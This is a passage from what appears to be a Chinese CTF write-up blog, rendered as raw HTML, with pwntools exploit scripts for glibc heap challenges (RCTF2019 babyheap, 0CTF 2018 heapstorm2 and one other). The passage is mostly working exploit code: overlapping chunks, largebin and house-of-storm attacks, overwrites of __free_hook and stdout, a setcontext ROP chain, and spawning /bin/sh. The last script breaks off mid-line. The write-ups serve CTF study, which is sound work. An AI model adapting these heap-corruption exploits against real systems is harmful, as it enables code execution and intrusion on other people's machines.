class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">libc_guess = <span class="number">0x7ffff7a0d000</span></span><br><span class="line">offset_libc_free_hook= libc_guess +libc.symbols[<span class="string">'__free_hook'</span>] </span><br><span class="line"><span class="keyword">print</span> hex(offset_libc_free_hook)</span><br><span class="line">offset_max_fast   = offset_libc_free_hook +<span class="number">0x50</span></span><br><span class="line"><span class="comment"># offset_max_fast=libc_guess+libc.symbols['global_max_fast']</span></span><br><span class="line">offset_libc_stdout=libc_guess+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x8</span>,p64(<span class="number">0x91</span>)) <span class="comment">#0</span></span><br><span class="line">edit(<span class="number">0x98</span>, p64(<span class="number">0x21</span>)) <span class="comment">#1</span></span><br><span class="line">edit(<span class="number">0xb8</span>, p64(<span class="number">0x21</span>)) <span class="comment">#2</span></span><br><span class="line">free(<span class="number">0x10</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit(<span class="number">0x18</span>, p16((offset_max_fast<span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>))</span><br><span class="line">malloc(<span class="number">0x80</span>)<span class="comment">#global_max_fast 赋值</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0xf1</span>))</span><br><span class="line">edit(<span class="number">0xf8</span>, p64(<span class="number">0x11</span>)) </span><br><span class="line"></span><br><span class="line">free(<span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0x8</span>, p64(<span class="number">0x91</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">edit(<span class="number">0x18</span>, p16((offset_libc_stdout+<span class="number">0x10</span><span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>)) <span class="comment">#read_end</span></span><br><span class="line"></span><br><span class="line">malloc(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">edit_(<span class="number">0x8</span>, p64(<span class="number">0xf1</span>))</span><br><span class="line">free_(<span class="number">0x10</span>)</span><br><span class="line">edit_(<span class="number">0x8</span>, p64(<span class="number">0x91</span>))</span><br><span class="line"><span class="comment"># gdb.attach(proc.pidof(p)[0])</span></span><br><span class="line">edit_(<span class="number">0x18</span>, p16((offset_libc_stdout+<span class="number">0x20</span><span class="number">-0x10</span>)&amp;<span class="number">0xffff</span>)) <span class="comment">#write_base</span></span><br><span class="line">malloc_(<span class="number">0x88</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x20</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line">fake = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(fake)</span><br><span class="line">addr_buf_base = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(addr_buf_base)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-16</span> - libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line"><span class="keyword">print</span> hex(libc_addr)</span><br><span class="line">p.recv(<span class="number">0x838</span>)</span><br><span class="line">addr_stack= u64(p.recv(<span class="number">8</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x3</span></span><br><span class="line"><span class="keyword">print</span> hex(addr_stack)</span><br><span class="line"></span><br><span class="line">libc.address=libc_addr</span><br><span class="line">addr_libc_gets          = libc.sep_function[<span class="string">'gets'</span>]</span><br><span class="line">addr_libc_stdout        = libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">addr_libc_dl_open_hook  = libc.symbols[<span class="string">'_dl_open_hook'</span>]</span><br><span class="line">addr_libc_io_file_jumps = libc.symbols[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">addr_libc_io_str_jumps  = addr_libc_io_file_jumps + <span class="number">0xc0</span></span><br><span class="line">fastbin_ptr=libc.symbols[<span class="string">'__free_hook'</span>]<span class="number">-0x1c88</span> +<span class="number">8</span></span><br><span class="line">free_hook=libc.sym[<span class="string">"__free_hook"</span>]</span><br><span class="line">system_addr=libc.sym[<span class="string">"system"</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">size=<span class="number">0x3920</span></span><br><span class="line">fake_size=p64(size+<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">0x38</span>,fake_size)</span><br><span class="line">edit(<span class="number">0x30</span>+size,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">free(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x40</span>,p64(system_addr))<span class="comment">#修改fd为system</span></span><br><span class="line">malloc(<span class="number">0x3910</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0x110</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">0x110</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="RCTF2019-babyheap"><a href="#RCTF2019-babyheap" class="headerlink" title="RCTF2019 babyheap"></a>RCTF2019 babyheap</h3><p>我直接用house of strom做的，很多大佬也用了改global_max_fast来做，我过后再去看看</p><p>这里直接利用overlap来泄露，然后largebin attack改free_hook为setcontext+53的gadget，然后在对应位置放入rop链，free该堆块，即执行<br>具体分析过程可以看我的<a href="https://c0yo7e.github.io/2020/08/01/largebin-attack-glibc2-23/#RCTF2019-babyheap">另一篇blog</a></p><h4 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line"><span class="comment"># context.terminal = ["tmux","split","-h"]</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./babyheap"</span>)</span><br><span class="line">libc = ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'1'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">   p.send(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'2'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line">   p.recvuntil(<span class="string">"Content: "</span>)</span><br><span class="line">   p.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'3'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">   p.recvuntil(<span class="string">"Choice: "</span>)</span><br><span class="line">   p.sendline(<span class="string">'4'</span>)</span><br><span class="line">   p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">   p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#0 0x21</span></span><br><span class="line">add(<span class="number">0x28</span>) <span class="comment">#1 0x31</span></span><br><span class="line">add(<span class="number">0xf8</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x508</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x508</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">0</span>) </span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x20</span>+p64(<span class="number">0x50</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_address=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_address)</span><br><span class="line">free_hook = libc.symbols[<span class="string">"__free_hook"</span>]+libc_address</span><br><span class="line">fake_chunk = free_hook - <span class="number">0x20</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x48</span>) <span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x100</span>)  <span class="comment">#11 -&gt; old chunk2-&gt;smallbin 0xe0</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#2 -&gt; chunk2 -&gt; smallbin</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">heap_base = u64(p.recvuntil(<span class="string">"\n"</span>,drop=<span class="literal">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0xe0</span></span><br><span class="line"><span class="keyword">print</span> hex(heap_base)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">0x68</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x4d8</span>) <span class="comment">#14</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)<span class="comment"># --&gt;0x508</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x30</span>) </span><br><span class="line">add(<span class="number">0x4d0</span>)</span><br><span class="line"><span class="comment"># delete(8) #unsorted bin</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">7</span>,<span class="string">'a'</span>*<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x18</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x4d8</span>)<span class="comment">#15</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)<span class="comment"># free -&gt;chunk5 but chunk8 here</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#构造一个largebin 一个unsortedbin</span></span><br><span class="line">add(<span class="number">0x4e8</span>) <span class="comment">#chunk5-&gt;largebin </span></span><br><span class="line">delete(<span class="number">6</span>) <span class="comment">#chunk2-&gt;unsortedbin</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x4f1</span>) + p64(<span class="number">0</span>) + p64(fake_chunk) +p64(<span class="number">0</span>)*<span class="number">2</span><span class="comment"># bk fackchunk-&gt;fd</span></span><br><span class="line">edit(<span class="number">14</span>,payload)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>) </span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)   <span class="comment">#bk --&gt;fakechunk-&gt;bk</span></span><br><span class="line">payload2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)<span class="comment">#size 0x56</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">15</span>,payload2)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">0x40</span>)</span><br><span class="line"><span class="comment"># edit(8,p64(0)*3+p64(0x511))</span></span><br><span class="line">ret = libc_address+<span class="number">0x937</span></span><br><span class="line">p_rdi_r = libc_address+ <span class="number">0x21112</span> <span class="comment">#0x21102</span></span><br><span class="line">p_rsi_r = libc_address+ <span class="number">0x202f8</span> <span class="comment">#0x202e8</span></span><br><span class="line">p_rdx_r = libc_address+<span class="number">0x1b92</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop_chain = <span class="string">"flag"</span>.ljust(<span class="number">8</span>,<span class="string">"\x00"</span>)+p64(<span class="number">0</span>)*<span class="number">12</span>+p64(heap_base+<span class="number">0x1c0</span>)   <span class="comment">#[rdi+0x68] is rdi</span></span><br><span class="line">rop_chain += p64(<span class="number">0</span>) <span class="comment">#[rdi+0x70] is rsi</span></span><br><span class="line">rop_chain += p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>)  <span class="comment">#[rdi+0x88] is rdx</span></span><br><span class="line">rop_chain = rop_chain.ljust(<span class="number">0xa0</span>,<span class="string">"\x00"</span>)</span><br><span class="line">rop_chain += p64(heap_base+<span class="number">0x1c0</span>+<span class="number">0x100</span>)</span><br><span class="line">rop_chain += p64(libc.symbols[<span class="string">"open"</span>]+libc_address)</span><br><span class="line">rop_chain = rop_chain.ljust(<span class="number">0x100</span>,<span class="string">"\x00"</span>)</span><br><span class="line"><span class="comment">#now read and write</span></span><br><span class="line">rop_chain += p64(p_rdi_r)+p64(<span class="number">3</span>)+p64(p_rsi_r)+p64(heap_base+<span class="number">0x1c0</span>+<span class="number">0x200</span>)</span><br><span class="line">rop_chain += p64(p_rdx_r)+p64(<span class="number">0x100</span>)</span><br><span class="line">rop_chain += p64(libc.symbols[<span class="string">"read"</span>]+libc_address)</span><br><span class="line"></span><br><span class="line">rop_chain += p64(p_rdi_r)+p64(<span class="number">1</span>)+p64(p_rsi_r)+p64(heap_base+<span class="number">0x1c0</span>+<span class="number">0x200</span>)</span><br><span class="line">rop_chain += p64(p_rdx_r)+p64(<span class="number">0x100</span>)</span><br><span class="line">rop_chain += p64(libc.symbols[<span class="string">"write"</span>]+libc_address)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">14</span>,rop_chain)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">"A"</span>*<span class="number">0x10</span>+p64(libc.symbols[<span class="string">"setcontext"</span>]+<span class="number">53</span>+libc_address))</span><br><span class="line">delete(<span class="number">14</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="0CTF-2018-heapstorm2"><a href="#0CTF-2018-heapstorm2" class="headerlink" title="0CTF 2018 heapstorm2"></a>0CTF 2018 heapstorm2</h3><p>off by one + house of storm</p><p>这题到后面绕过leak的条件那里有点复杂，不停地修改chunk的地址和size什么的，这个地方还是理了一段时间的<br>最后再利用堆块地址改成free_hook，将free_hook的地址改成one_gadget就可以getshell了<br>(最近都在刷house of storm的题了)</p><h4 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./heapstorm2'</span>)</span><br><span class="line"><span class="comment"># p = remote('node3.buuoj.cn',29225)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./heapstorm2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malloc</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line">    p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">    p.sendline(str(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    one_gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">0x18</span>)</span><br><span class="line">    malloc(<span class="number">0x508</span>)</span><br><span class="line">    malloc(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">0x18</span>)</span><br><span class="line">    malloc(<span class="number">0x508</span>)</span><br><span class="line">    malloc(<span class="number">0x18</span>)</span><br><span class="line">    malloc(<span class="number">0x18</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">1</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line">    edit(<span class="number">4</span>,<span class="string">'a'</span>*<span class="number">0x4f0</span>+p64(<span class="number">0x500</span>))</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">'a'</span>*(<span class="number">0x18</span><span class="number">-0xc</span>))</span><br><span class="line">    malloc(<span class="number">0x18</span>)</span><br><span class="line">    malloc(<span class="number">0x4d8</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">0x30</span>)</span><br><span class="line">    malloc(<span class="number">0x4e0</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    edit(<span class="number">3</span>,<span class="string">'a'</span>*(<span class="number">0x18</span><span class="number">-0xc</span>))</span><br><span class="line">    malloc(<span class="number">0x18</span>)</span><br><span class="line">    malloc(<span class="number">0x4d8</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">4</span>)</span><br><span class="line">    delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    malloc(<span class="number">0x40</span>)</span><br><span class="line"></span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line">    malloc(<span class="number">0x4e8</span>)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    storage = <span class="number">0x13370000</span> + <span class="number">0x800</span></span><br><span class="line">    fake_chunk = storage - <span class="number">0x20</span></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">2</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>) + p64(fake_chunk)</span><br><span class="line">    edit(<span class="number">7</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    payload2 = p64(<span class="number">0</span>)*<span class="number">4</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x4e1</span>)<span class="comment">#size</span></span><br><span class="line">    payload2 += p64(<span class="number">0</span>) + p64(fake_chunk+<span class="number">8</span>)</span><br><span class="line">    payload2 += p64(<span class="number">0</span>) + p64(fake_chunk<span class="number">-0x18</span><span class="number">-5</span>)</span><br><span class="line">    edit(<span class="number">8</span>,payload2)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    malloc(<span class="number">0x48</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">2</span>,p64(<span class="number">0</span>)*<span class="number">5</span>+p64(<span class="number">0x13377331</span>)+p64(storage))</span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x13377331</span>)+p64(storage) + p64(<span class="number">0x1000</span>) + p64(storage<span class="number">-0x20</span>+<span class="number">3</span>)+p64(<span class="number">8</span>) <span class="comment">#chunk0 -chunk1</span></span><br><span class="line">    edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Chunk[1]: '</span>)</span><br><span class="line">    heap_base = u64(p.recvline().strip(<span class="string">'\n'</span>)) - <span class="number">0x60</span></span><br><span class="line">    <span class="keyword">print</span> hex(heap_base)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x13377331</span>)+p64(storage) + p64(<span class="number">0x1000</span>) + p64(heap_base+<span class="number">0x60</span>+<span class="number">0x10</span>) + p64(<span class="number">8</span>)</span><br><span class="line">    edit(<span class="number">0</span>,payload)</span><br><span class="line">    show(<span class="number">1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'Chunk[1]: '</span>)</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>)) - <span class="number">88</span> - <span class="number">0x3c4b20</span></span><br><span class="line">    <span class="keyword">print</span> hex(libc_base)</span><br><span class="line">    free_hook = libc_base + libc.symbols[<span class="string">'__free_hook'</span>]</span><br><span class="line">    getshell = one_gadgets[<span 